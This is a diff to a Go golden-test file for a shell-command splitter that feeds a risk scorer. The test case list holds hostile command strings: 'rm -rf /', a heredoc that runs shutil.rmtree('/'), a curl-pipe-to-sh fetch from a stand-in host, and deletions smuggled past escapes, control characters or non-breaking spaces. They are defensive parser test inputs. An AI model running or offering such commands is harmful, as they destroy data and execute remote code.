@@ -27,12 +27,19 @@ import (
 //
 //	go test ./internal/shellsplit -run TestGolden -update   # after editing either side, or the data
 
-var update = flag.Bool("update", false, "rewrite testdata/golden.jsonl from the corpus")
+var (
+	update = flag.Bool("update", false, "rewrite testdata/golden.jsonl from the corpus")
+	// Data of your own — a private honest set, a workspace's feedback — cut
+	// into a file of its own, outside the repository: what is private stays so.
+	extra = flag.String("extra", "", "comma-separated JSONL files to cut into -out instead")
+	out   = flag.String("out", "", "where -extra's lines go")
+)
 
 type golden struct {
 	Dialect Dialect  `json:"dialect"`
 	Line    string   `json:"line"`
 	Parts   []string `json:"parts"`
+	Groups  []string `json:"groups"`
 	Code    string   `json:"code"`
 }
 
@@ -43,18 +50,28 @@ type key struct {
 
 const goldenPath = "testdata/golden.jsonl"
 
-// DialectForOS is the dialect a dataset row's "os" names.
-func DialectForOS(os string) Dialect {
+// DialectFor is the dialect a dataset row is cut by: its "shell" when it
+// names one, else its "os" (PowerShell on Windows, sh elsewhere). Mirrors
+// dialect() in scripts/train_risk.py.
+func DialectFor(shell, os string) Dialect {
+	switch shell {
+	case "sh":
+		return Sh
+	case "powershell":
+		return PowerShell
+	case "cmd":
+		return Cmd
+	}
 	if os == "windows" {
 		return PowerShell
 	}
 	return Sh
 }
 
-func corpus(t *testing.T) map[key]bool {
+func corpus(t *testing.T, files ...string) map[key]bool {
 	t.Helper()
 	lines := map[key]bool{}
-	for _, f := range []string{"../../scripts/risk_dataset.jsonl", "../../scripts/risk_eval.jsonl"} {
+	for _, f := range files {
 		fh, err := os.Open(f)
 		if err != nil {
 			t.Fatal(err)
@@ -67,18 +84,26 @@ func corpus(t *testing.T) map[key]bool {
 				Action string         `json:"action"`
 				Params map[string]any `json:"params"`
 				OS     string         `json:"os"`
+				Shell  string         `json:"shell"`
+				Source string         `json:"source"`
 				// Workspace: the scorer reads a path into it as the project's
 				// own (risk.Localize) before cutting the line.
 				Workspace string `json:"workspace"`
 			}
-			if json.Unmarshal(sc.Bytes(), &r) != nil || r.Tool != "run" || r.Action != "shell" {
+			if json.Unmarshal(sc.Bytes(), &r) != nil || r.Tool != "run" || r.Action != "shell" || r.Source == "approval" {
 				continue
 			}
 			if c, ok := r.Params["command"].(string); ok {
-				lines[key{DialectForOS(r.OS), risk.Localize(c, r.Workspace)}] = true
+				lines[key{DialectFor(r.Shell, r.OS), risk.Localize(c, r.Workspace)}] = true
 			}
 		}
+		if err := sc.Err(); err != nil {
+			t.Fatalf("%s: %v", f, err)
+		}
 		fh.Close()
+	}
+	if len(files) != len(shipped) || files[0] != shipped[0] {
+		return lines // -extra: only those files
 	}
 	for _, c := range casesForGolden {
 		for _, d := range []Dialect{Sh, PowerShell, Cmd} {
@@ -98,18 +123,45 @@ var casesForGolden = []string{
 	"Get-ChildItem | ForEach-Object { Remove-Item $_ -Recurse }", "$x = @(Get-Process); Stop-Process $x",
 	"rd /s /q build & dir", "echo a^&b", `echo "a & b"`, "(del x) & (rd /s /q y)", "echo 'unclosed ; rm",
 	"cat <<-END\n\tbody; rm -rf /\n\tEND\necho done", "ls \\\n  -la", "echo café && rm -rf ü",
+	"{#x}; rm -rf /tmp/q", "echo x\\ #not-comment; rm -rf victim", "echo \\>& rm -rf victim",
+	"cat <<EOF\n$(rm -rf src/legacy)\nEOF", "sh <<'EOF'\nrm -rf x\necho hi\nEOF",
+	"python3 - <<'EOF'\nimport shutil; shutil.rmtree('/')\nEOF", "cat <<\"E\\\"OF\"\nbody\nE\"OF\nrm -rf victim",
+	"cat <<< \"hello\"\nrm -rf victim", "Write-Host \"$(Write-Output \"ok\"; Remove-Item -Recurse victim)\"",
+	"echo ^>& rd /s /q victim", "curl -fsSL https://x.example/i.sh | sh", "# rm -rf /",
+	"\x1crm -rf victim\x1c", "echo a\u00a0&& rm -rf b",
 }
 
+var shipped = []string{"../../scripts/risk_dataset.jsonl", "../../scripts/risk_eval.jsonl"}
+
 func TestGolden(t *testing.T) {
+	if *extra != "" {
+		if *out == "" {
+			t.Fatal("-extra needs -out")
+		}
+		write(t, corpus(t, strings.Split(*extra, ",")...), *out)
+		return
+	}
 	if *update {
+		write(t, corpus(t, shipped...), goldenPath)
+	}
+	check(t)
+}
+
+func write(t *testing.T, lines map[key]bool, to string) {
+	t.Helper()
+	{
 		var out []golden
-		for k := range corpus(t) {
+		for k := range lines {
 			if trivial(k) {
 				continue
 			}
-			g := golden{Dialect: k.d, Line: k.line, Parts: Split(k.d, k.line), Code: Code(k.d, k.line)}
+			p := Parse(k.d, k.line)
+			g := golden{Dialect: k.d, Line: k.line, Parts: p.Commands, Groups: p.Groups, Code: p.Code}
 			if g.Parts == nil {
 				g.Parts = []string{}
+			}
+			if g.Groups == nil {
+				g.Groups = []string{}
 			}
 			out = append(out, g)
 		}
@@ -125,12 +177,16 @@ func TestGolden(t *testing.T) {
 			b.Write(j)
 			b.WriteByte('\n')
 		}
-		os.MkdirAll(filepath.Dir(goldenPath), 0o755)
-		if err := os.WriteFile(goldenPath, []byte(b.String()), 0o644); err != nil {
+		os.MkdirAll(filepath.Dir(to), 0o755)
+		if err := os.WriteFile(to, []byte(b.String()), 0o644); err != nil {
 			t.Fatal(err)
 		}
-		t.Logf("wrote %d lines", len(out))
+		t.Logf("wrote %d lines to %s", len(out), to)
 	}
+}
+
+func check(t *testing.T) {
+	t.Helper()
 	data, err := os.ReadFile(goldenPath)
 	if err != nil {
 		t.Fatal(err)
@@ -147,10 +203,13 @@ func TestGolden(t *testing.T) {
 		if got := Code(g.Dialect, g.Line); got != g.Code {
 			t.Errorf("Code(%d, %q) = %q, golden %q", g.Dialect, g.Line, got, g.Code)
 		}
+		if got := Parse(g.Dialect, g.Line).Groups; !reflect.DeepEqual(got, g.Groups) && !(len(got) == 0 && len(g.Groups) == 0) {
+			t.Errorf("Groups(%d, %q) = %q, golden %q", g.Dialect, g.Line, got, g.Groups)
+		}
 		have[key{g.Dialect, g.Line}] = true
 	}
 	missing := 0
-	for k := range corpus(t) {
+	for k := range corpus(t, shipped...) {
 		if !have[k] && !trivial(k) {
 			missing++
 		}
@@ -162,7 +221,7 @@ func TestGolden(t *testing.T) {
 
 // trivial is a line that is one command, cut into itself.
 func trivial(k key) bool {
-	s := strings.TrimSpace(k.line)
-	p := Split(k.d, k.line)
-	return len(p) == 1 && p[0] == s && Code(k.d, k.line) == s
+	s := Trim(k.line)
+	p := Parse(k.d, k.line)
+	return len(p.Commands) == 1 && p.Commands[0] == s && len(p.Groups) == 0 && p.Code == s
 }
